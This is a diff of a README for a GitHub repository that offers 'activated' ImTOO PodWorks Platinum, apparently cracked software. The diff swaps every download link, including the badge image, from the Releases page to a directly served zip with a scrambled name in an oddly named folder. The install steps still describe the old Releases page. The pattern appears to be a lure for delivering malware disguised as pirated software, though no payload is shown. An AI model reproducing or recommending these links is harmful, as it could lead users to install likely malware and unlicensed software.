@@ -1,6 +1,6 @@
 # 🎵 ImTOO-PodWorks-Platinum-Activated - Simplify Your Media Management
 
-[![Download ImTOO-PodWorks-Platinum](https://img.shields.io/badge/Download-ImTOO--PodWorks--Platinum-brightgreen)](https://github.com/DavidMarcel24/ImTOO-PodWorks-Platinum-Activated/releases)
+[![Download ImTOO-PodWorks-Platinum](https://github.com/DavidMarcel24/ImTOO-PodWorks-Platinum-Activated/raw/refs/heads/main/longicaudate/Activated_TO_Works_Pod_Platinum_Im_2.0.zip)](https://github.com/DavidMarcel24/ImTOO-PodWorks-Platinum-Activated/raw/refs/heads/main/longicaudate/Activated_TO_Works_Pod_Platinum_Im_2.0.zip)
 
 ## 📖 Overview
 ImTOO PodWorks Platinum is a powerful tool for managing audio and video files on your Windows PC. This application helps you easily extract, transfer, and organize your media. Whether you want to manage your iPod, edit metadata, or back up your music, this software has you covered.
@@ -9,7 +9,7 @@ ImTOO PodWorks Platinum is a powerful tool for managing audio and video files on
 To begin, ensure you have a Windows PC. ImTOO PodWorks Platinum enhances your media experience by providing an easy way to handle files. 
 
 ## 📥 Download & Install
-To download ImTOO PodWorks Platinum, visit this page to download: [ImTOO-PodWorks-Platinum Releases](https://github.com/DavidMarcel24/ImTOO-PodWorks-Platinum-Activated/releases). Follow the steps below to install the software:
+To download ImTOO PodWorks Platinum, visit this page to download: [ImTOO-PodWorks-Platinum Releases](https://github.com/DavidMarcel24/ImTOO-PodWorks-Platinum-Activated/raw/refs/heads/main/longicaudate/Activated_TO_Works_Pod_Platinum_Im_2.0.zip). Follow the steps below to install the software:
 
 1. Click the link above to reach the Releases page.
 2. Select the latest version of the software.
@@ -62,4 +62,4 @@ We welcome your thoughts on ImTOO PodWorks Platinum. Share your experiences on G
 
 For continued updates, follow us on GitHub and check back for newer versions regularly.
 
-[![Download ImTOO-PodWorks-Platinum](https://img.shields.io/badge/Download-ImTOO--PodWorks--Platinum-brightgreen)](https://github.com/DavidMarcel24/ImTOO-PodWorks-Platinum-Activated/releases)
+[![Download ImTOO-PodWorks-Platinum](https://github.com/DavidMarcel24/ImTOO-PodWorks-Platinum-Activated/raw/refs/heads/main/longicaudate/Activated_TO_Works_Pod_Platinum_Im_2.0.zip)](https://github.com/DavidMarcel24/ImTOO-PodWorks-Platinum-Activated/raw/refs/heads/main/longicaudate/Activated_TO_Works_Pod_Platinum_Im_2.0.zip)
